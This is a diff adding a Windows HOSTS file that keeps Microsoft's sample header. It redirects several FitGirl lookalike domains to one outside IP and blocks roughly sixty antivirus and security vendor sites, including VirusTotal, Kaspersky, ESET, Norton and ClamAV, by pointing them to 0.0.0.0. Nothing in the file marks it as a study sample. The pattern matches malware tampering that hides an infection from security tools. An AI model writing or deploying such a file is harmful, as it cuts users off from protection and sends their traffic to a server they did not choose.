@@ -1,0 +1,83 @@
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+# localhost name resolution is handled within DNS itself.
+#	127.0.0.1       localhost
+#	::1             localhost
+109.94.209.70      fitgirlrepacks.co               # Fake FitGirl site
+109.94.209.70      fitgirl-repacks.cc              # Fake FitGirl site
+109.94.209.70      fitgirl-repack.com              # Fake FitGirl site
+109.94.209.70      www.fitgirlrepacks.co           # Fake FitGirl site
+109.94.209.70      www.fitgirl-repacks.cc          # Fake FitGirl site
+109.94.209.70      www.fitgirl-repack.com          # Fake FitGirl site
+	0.0.0.0 virustotal.com
+	0.0.0.0 www.virustotal.com
+	0.0.0.0 totalav.com
+	0.0.0.0 www.totalav.com
+	0.0.0.0 scanguard.com
+	0.0.0.0 www.scanguard.com
+	0.0.0.0 totaladblock.com
+	0.0.0.0 www.totaladblock.com
+	0.0.0.0 pcprotect.com
+	0.0.0.0 www.pcprotect.com
+	0.0.0.0 mcafee.com
+	0.0.0.0 www.mcafee.com
+	0.0.0.0 bitdefender.com
+	0.0.0.0 www.bitdefender.com
+	0.0.0.0 us.norton.com
+	0.0.0.0 www.us.norton.com
+	0.0.0.0 avg.com
+	0.0.0.0 www.avg.com
+
+
+	0.0.0.0 pandasecurity.com
+	0.0.0.0 www.pandasecurity.com
+	0.0.0.0 avira.com
+	0.0.0.0 www.avira.com
+	0.0.0.0 norton.com
+	0.0.0.0 www.norton.com
+	0.0.0.0 eset.com
+	0.0.0.0 www.eset.com
+	0.0.0.0 zillya.com
+	0.0.0.0 www.zillya.com
+	0.0.0.0 kaspersky.com
+	0.0.0.0 www.kaspersky.com
+	0.0.0.0 usa.kaspersky.com
+	0.0.0.0 www.usa.kaspersky.com
+	0.0.0.0 sophos.com
+	0.0.0.0 www.sophos.com
+	0.0.0.0 home.sophos.com
+	0.0.0.0 www.home.sophos.com
+	0.0.0.0 adaware.com
+	0.0.0.0 www.adaware.com
+	0.0.0.0 bullguard.com
+	0.0.0.0 www.bullguard.com
+	0.0.0.0 clamav.net
+	0.0.0.0 www.clamav.net
+	0.0.0.0 drweb.com
+	0.0.0.0 www.drweb.com
+	0.0.0.0 emsisoft.com
+	0.0.0.0 www.emsisoft.com
+	0.0.0.0 f-secure.com
+	0.0.0.0 www.f-secure.com
+	0.0.0.0 zonealarm.com
+	0.0.0.0 www.zonealarm.com
+	0.0.0.0 trendmicro.com
+	0.0.0.0 www.trendmicro.com
+	0.0.0.0 ccleaner.com
+	0.0.0.0 www.ccleaner.com
